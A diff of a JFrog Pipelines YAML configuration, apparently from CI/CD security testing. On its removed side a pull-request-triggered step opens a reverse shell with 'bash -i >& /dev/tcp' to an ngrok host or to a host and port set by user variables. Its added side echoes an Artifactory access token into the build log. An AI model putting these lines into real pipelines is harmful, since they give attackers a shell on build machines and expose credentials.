@@ -1,35 +1,33 @@
 resources:
-  - name: repo_git
+  - name: myRepo_native
     type: GitRepo
     configuration:
-      gitProvider: assaf_gh
-      path: assaf-levkovich-jf/appsec-cicd-test
-      buildOn:
-        pullRequestCreate: true
-        commit: false
+      path: jfrog/jfrog_pipelines
+      gitProvider: myGithub
+      branches:
+        include: master
 
 pipelines:
-  - name: npm_install_pipeline
-    configuration:
-      environmentVariables:
-        readOnly:
-          env:
-            default: "ng_address"
-            allowCustom: true
-          env2:
-            default: "ng_port"
-            allowCustom: true
+  - name: myPipeline_native
     steps:
-      - name: build_on_pr
+      - name: first_step
         type: Bash
         configuration:
-          inputResources:
-            - name: repo_git
-          # runtime:
-          #   type: host
+          integrations:
+            - name: {{.jfrog-pipelines.localArtifactory}}
         execution:
           onExecute:
-            - echo "A pull request has triggered this pipeline"
-            - cd $res_repo_git_resourcePath
-            #- /bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/16856 0>&1'
-            - /bin/bash -c 'bash -i >& /dev/tcp/${env[0]}/${env2[0]} 0>&1'
+            - echo "first_step"
+            - jfrog config add jftest-$step_id --url https://avigdor.jfrog.io --access-token ${JFROG_LOCAL_ARTIFACTORY_TOKEN}
+            - touch test.txt
+            - echo "hello" > test.txt
+            - jfrog rt upload test.txt demo-sampleRepo/test.txt --server-id jftest-$step_id
+      - name: second_step
+        type: Bash
+        configuration:
+          inputSteps:
+            - name: first_step
+        execution:
+          onExecute:
+            - echo "second_step"
+            - echo "$JFROG_LOCAL_ARTIFACTORY_TOKEN"
